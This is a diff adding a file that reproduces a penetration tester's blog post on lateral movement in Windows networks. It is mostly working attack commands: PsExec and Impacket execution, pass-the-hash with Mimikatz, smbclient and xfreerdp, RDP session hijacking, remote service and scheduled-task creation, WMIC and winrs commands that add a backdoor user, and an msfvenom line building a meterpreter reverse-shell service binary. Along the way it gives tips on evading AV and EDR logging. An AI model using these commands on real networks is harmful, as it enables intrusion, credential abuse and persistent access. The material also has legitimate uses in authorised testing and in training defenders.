@@ -1,0 +1,199 @@
+
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+#@  
+#@  LATERAL MOVEMENT IN A NETWORK - GOOD ARTICLE
+#@  
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   2020-08-04[Aug-Tue]00-32AM 
+
+
+##https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/
+
+
+Lateral movement usually refers to techniques that threat actors use to move from one host to another in an internal network to search for key data and assets that would accomplish a set of objectives. While lateral movement isn’t difficult, but doing it with good operational security by generating the least amount of logs (or making it look legitimate) has proven to be quite a challenge. This blog post details what I’ve learned throughout my experience as an offensive operator and penetration tester. Nothing new, this is just how I learn and remember information.
+PsExec
+Microsoft Sysinternals Suite
+
+It is important to note that there are several versions of PsExec that offensive operators use to pivot and move laterally. The first is from Microsoft’s Sysinternals suite and allows users to execute interactive commands (like powershell, vssadmin) over SMB using named pipes.
+
+How this essentially works is that it connects to the ADMIN$ share, and uploads a psexesvc.exe file. Then the service control manager (sc) is used to start the service binary, creates named pipe on the destination host, and uses said pipe for input and output operations.
+
+It’s important to note that this behaviour is not blocked by Cylance PROTECT, but generates a log with informational risk level on the dashboard. Same behaviour is noted with enSilo EDR appliances and McAfee endpoint protection.
+
+Running PsExec with credentials:
+
+PsExec.exe /accepteula \\192.168.1.2 -u CORP\user -p password cmd.exe
+
+Running PsExec with passing the hash:
+
+# By default, PsExec does not pass the hash by itself, it requires Windows Credential Editor or Mimikatz
+sekurlsa::pth /user:user /domain:CORP /ntlm:8846f7eaee8fb117ad06bdd830b7586c
+PsExec.exe /accepteula \\192.168.1.2 cmd.exe
+
+Running PsExec by uploading malicious executable:
+
+# This will continue the PsExec session through named pipe, and will only terminate once the process is terminated. Additionally this -c parameter will manually cleanup the executable.
+PsExec.exe /accepteula \\192.168.1.2 -u CORP\user -p password -c update.exe
+
+# This will kill the PsExec session and leave the malicious executable on disk
+PsExec.exe /accepteula \\192.168.1.2 -u CORP\user -p password -d update.exe
+
+Impacket Toolsuite
+
+The impacket toolsuite (python psexec.py) does a very similar thing to Microsoft Sysinternals Suite. However, in most cases interactive binaries such as Powershell, vssadmin, plink, and many others will cause the service to fail. Instead of uploading psexecsv service binary, it uploads a service binary with an arbitrary name. This behaviour will be flagged and stopped by some AV and EDR products.
+
+Running python psexec with credentials:
+
+python psexec.py user:password@192.168.1.2
+
+Running python psexec with passing the hash:
+
+python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c user@192.168.1.2 cmd.exe
+
+It’s important to make note of smbexec.py in the Impacket toolsuite. While psexec uploads a service binary, smbexec doesn’t. Looking at the Service Control Manager (Event 7045), on the Service File Name line:
+
+    %COMSPEC% /Q /c echo cd ^> \Windows\Temp_output2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
+
+This is essentially echoing the command to be executed in a bat script, and redirects to stdout and stderror to a Temp file, then runs the bat script then deletes it. It does this for every command. This will give the operator a psuedo shell.
+
+Execute:
+
+python smbexec.py user:password@192.168.1.2
+
+Pass the hash:
+
+python smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c user@192.168.1.2 cmd.exe
+
+Metasploit PsExec
+
+A word about metasploit’s psexec, there are a few modules that I played with in my OSCP days:
+
+exploit/windows/smb/psexec
+exploit/windows/local/current_user_psexec
+auxiliary/admin/smb/psexec_command
+auxiliary/scanner/smb/psexec_loggedin_users
+
+Service binaries for Metasploit’s PsExec is flagged by a majority of AV vendors. It behaves generally the same way as Microsoft Sysinternals Suite, but when the Service Control Manager starts the service, it starts a new rundll32.exe process and allocates executable memory inside the process, and copies shellcode into it.
+A Small Word about Passing the Hash Attacks
+
+I don’t think I can do justice to harmj0y’s post from SpectreOps. Please check out this link for very detailed information: Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy .
+
+This will be short TL;DR of that post.
+
+Checking LocalAccountTokenFilterPolicy:
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy
+
+If this is enabled (set to a 1), that means, you can pass the hash with a non-rid 500 acount. This means Domain Users can use pass the hash to login. This is not set by default. The only exception is if Admin Approval Mode is enabled. If disabled, local administrators cannot pass the hash.
+
+Checking FilterAdministratorToken:
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v FilterAdministratorToken
+
+If this is enabled and LocalAccountTokenFilterPolicy is disabled, it will prohibit pass the hash attacks. This is not applicable if both this and LocalAccountTokenFilterPolicy is enabled. By default this value is turned off, which leaves the local administrator account unprotected.
+Smbclient
+
+This tool is often used to test connectivity to Windows shares. Transferring files, uploading files, and can have versatile backup functionality. Needless to say, you can use hashes (given they have enough permissions) to look for passwords on hosts.
+
+Smbclient with credentials:
+
+# List Shares
+smbclient -L 192.168.1.2 -U user -W CORP
+
+# Access C Drive
+smbclient //192.168.1.2/C$ -U user -W CORP
+
+Smbclient with hashes:
+
+smbclient //192.168.1.2/C$ -U user%8846f7eaee8fb117ad06bdd830b7586c --pw-nt-hash
+
+Service Controller
+Schedule Service Over SMB
+
+This essentially controls services and is actually a pretty neat trick. A remote attacker can schedule tasks over SMB. File does have to touch disk. This is how:
+
+sc \\192.168.1.2 create msfService binpath="C:\Windows\System32\service.exe"
+sc \\192.168.1.2 start msfService
+
+Generating a service binary with Metasploit (Cobalt it’s Windows Service EXE):
+
+msfvenom -p windows/meterpreter/reverse/tcp -f exe-service LHOST=192.168.1.1 LPORT=4444 -o service.exe
+
+Hijacking RDP
+
+Sometimes you might find yourself on a host with an active RDP session. If they are disconnected (but aren’t logged off), you will probably be able to take over their session like this:
+
+# See user session details
+query user
+
+# Create a service binary path replacing their session with yours
+sc create jack binpath= "cmd.exe /k tscon 1 /dest:YOURSESSIONID (e.g. rdp-tcp#4)"
+
+# Start service
+net start jack
+
+With Mimikatz:
+
+ts::sessions
+ts::remote /id:2
+privilege::debug
+token::elevate
+ts::remote /id:2
+
+Windows Management Instrumentation
+
+By default Windows Management Instrumentation is built into windows and allows remote access by commucating with remote procedure calls using port 135. It can be used to start a service or execut a command remotely.
+Using the Built-In WMIC
+
+Run this from an interactive cmd.exe by:
+
+# Start a service
+wmic /node:192.168.1.2 /user:CORP\user /password:password process call create "C:\Windows\System32\service.exe”
+
+# Add a user
+wmic /node:192.168.1.2 /user:CORP\user /password:password  process call create "cmd.exe /c net user hacker P@ssw0rd /add"
+
+Impacket Toolsuite
+
+From my experience, it seems that WMIC is quieter than psexec.
+
+python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c user@192.168.1.2
+
+Windows Remote Management
+
+A.K.A WinRM. This does similar things as WMI but through the HTTP/HTTPS protocol. In your initial port scan, if you find that port 5985 (HTTP) and port 5986 (HTTPS), that means you can use this technique. From Windows server 2012R2 and above, you can leverage this technique.
+
+Note: You will need WinRM listners even on the client.
+
+Enable with Powershell on attacker Windows machine:
+
+Enable-PSRemoting -Force
+
+With a malicious binary uploaded, run:
+
+# Start a malicious service
+winrs -r:192.168.1.2 -u:CORP\user -p:password service.exe
+
+# Add a user
+winrs -r:192.168.1.2 -u:CORP\user -p:password "cmd.exe /c net user hacker P@ssw0rd /add"
+
+Schedule Tasks
+
+Another way to schedule a task remotely, but over port 135 using DCE/RPC communication. Using Powershell:
+
+schtasks /create /tn ServiceTask /tr C:\Windows\System32\service.exe /sc once /st 00:00 /S 192.168.1.2 /RU System
+
+schtasks /run /tn ServiceTask /S 192.168.1.2
+
+schtasks /F /delete /tn ServiceTask /S 192.168.1.2
+
+RDP
+
+Many of the above examples can be used to remotely start a service. However, there are times that dropping a disk on file might trigger detection, hence, adding a user alternative also exists then performing an interactive login.
+
+If Restricted Admin is not enabled, and the target system is Windows 2012 R2 or Windows 8.1, it is possible to pass the hash with xfreedp. Pass the hash through RDP:
+
+xfreerdp /u:user /d:CORP /pth:8846f7eaee8fb117ad06bdd830b7586c /v:192.168.1.2
+
+Conclusion
+
+Once again, no new information covered here, future techniques that I learn may also be appended to this blog post. If you feel any information posted here is inaccurate, don’t hesitate to tell me why. Will definitely rectify.
